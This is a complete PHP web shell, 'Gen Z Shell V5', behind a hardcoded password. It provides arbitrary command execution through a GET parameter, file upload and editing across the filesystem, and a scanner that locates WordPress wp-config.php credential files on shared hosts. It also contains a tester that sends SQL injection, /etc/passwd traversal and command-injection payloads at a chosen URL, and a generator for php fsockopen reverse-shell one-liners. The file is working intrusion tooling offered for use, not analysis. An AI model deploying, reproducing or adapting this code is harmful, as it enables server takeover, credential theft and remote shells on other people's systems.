<?php
session_start();

// -------------------- CONFIG --------------------
$password = 'genz123'; // 🔐 Ganti password di sini

// -------------------- AUTH --------------------
if (!isset($_SESSION['auth'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $password) {
        $_SESSION['auth'] = true;
    } else {
        loginPage();
        exit;
    }
}

function loginPage() {
    echo <<<HTML
    <html><body style="background:#111;color:#fff;text-align:center;margin-top:20%;">
    <h1>🔥 Gen Z Shell Login 🔥</h1>
    <form method="post">
    <input type="password" name="pass" placeholder="Password" style="padding:10px;border-radius:5px;"><br><br>
    <button type="submit" style="padding:10px 30px;">Enter</button>
    </form></body></html>
    HTML;
}

error_reporting(0);
set_time_limit(0);

// -------------------- CORE --------------------
$baseDir = "/";
$cwd = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
if (strpos($cwd, $baseDir) !== 0) $cwd = $baseDir;

// Command Execution
if (isset($_GET['cmd'])) {
    chdir($cwd);
    $output = shell_exec($_GET['cmd'] . " 2>&1");
}

// File Upload
if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $cwd . "/" . $_FILES['file']['name']);
}

// File Editor
if (isset($_POST['editfile']) && isset($_POST['content'])) {
    file_put_contents($_POST['editfile'], $_POST['content']);
}

// Mini WAF Bypass Tester
function wafTest($url, $payloads) {
    $results = [];
    foreach ($payloads as $p) {
        $ch = curl_init($url . $p);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $resp = curl_exec($ch);
        $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $results[] = "$p => HTTP: $http";
        curl_close($ch);
    }
    return $results;
}

// Reverse Shell Generator
function reverseShellCode($ip, $port) {
    return "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
}

?>
<!DOCTYPE html>
<html>
<head>
<title>Gen Z Shell V5 🔥</title>
<style>
body { background:#111; color:#eee; font-family:Consolas, monospace; padding:20px; }
a { color:#6cf; text-decoration:none; }
a:hover { text-decoration:underline; }
h1 { color:#f55; }
input,button,textarea { padding:5px 10px; margin:5px; border-radius:5px; }
pre { background:#222; padding:10px; overflow:auto; }
.sidebar { position:fixed; top:0; left:0; bottom:0; width:260px; background:#000; padding:20px; border-right:2px solid #333; }
.content { margin-left:280px; }
</style>
</head>
<body>

<div class="sidebar">
    <h1>🔥 Gen Z V5</h1>
    <p><b>Current Dir:</b> <?php echo htmlspecialchars($cwd); ?></p>
    <p><a href="?">Home</a></p>
    <ul>
    <?php
    $files = @scandir($cwd);
    if ($cwd != $baseDir) {
        echo "<li><a href='?dir=" . urlencode(dirname($cwd)) . "'>⬅️ Parent</a></li>";
    }
    foreach ($files as $f) {
        if ($f === ".") continue;
        $path = $cwd . DIRECTORY_SEPARATOR . $f;
        $link = "?dir=" . urlencode($path);
        echo "<li>". (is_dir($path) ? "📂" : "📄") ." <a href='$link'>$f</a></li>";
    }
    ?>
    </ul>
</div>

<div class="content">
<h2>💻 Command Execution</h2>
<form>
    <input type="hidden" name="dir" value="<?php echo htmlspecialchars($cwd); ?>">
    <input type="text" name="cmd" style="width:400px;" placeholder="ls -la">
    <button>Run</button>
</form>
<?php if(isset($output)) echo "<pre>$output</pre>"; ?>

<h2>📤 File Upload</h2>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="hidden" name="dir" value="<?php echo htmlspecialchars($cwd); ?>">
    <button>Upload</button>
</form>

<h2>📝 File Editor</h2>
<?php 
if (is_file($cwd)) {
    $content = htmlspecialchars(file_get_contents($cwd));
    echo "<form method='post'><textarea name='content' rows='20' cols='80'>$content</textarea><br>
    <input type='hidden' name='editfile' value='".htmlspecialchars($cwd)."'>
    <button>Save</button></form>";
} else {
    echo "Select a file to edit.";
}
?>

<h2>🔎 WP Path Scanner</h2>
<?php
$scanDirs = ['/home/', '/home1/', '/var/www/', '/var/www/html/'];
foreach ($scanDirs as $base) {
    foreach (glob($base . '*', GLOB_ONLYDIR) as $sub) {
        $pub = $sub.'/public_html/';
        if (is_dir($pub)) {
            echo "<b>$pub</b><br>";
            foreach (['wp-config.php','wp-content/uploads/','wp-content/plugins/'] as $subfile) {
                $full = $pub.$subfile;
                if (file_exists($full)) echo "✅ $subfile<br>";
            }
        }
    }
}
?>

<h2>🧪 Mini WAF Bypass Tester</h2>
<form method="post">
<input type="text" name="url" placeholder="Target URL" size="50">
<button>Test</button>
</form>
<?php
if (isset($_POST['url'])) {
    $payloads = ["' OR 1=1 -- ", "'; DROP TABLE users; --", "../../../../etc/passwd", "<?php phpinfo();?>", "id;uname -a"];
    $results = wafTest($_POST['url'], $payloads);
    echo "<pre>".implode("\n",$results)."</pre>";
}
?>

<h2>📡 Reverse Shell Generator</h2>
<form method="post">
IP: <input type="text" name="rip" value="127.0.0.1">
Port: <input type="text" name="rport" value="9001">
<button>Generate</button>
</form>
<?php
if (isset($_POST['rip'],$_POST['rport'])) {
    echo "<pre>".reverseShellCode($_POST['rip'],$_POST['rport'])."</pre>";
}
?>
</div>
</body>
</html>
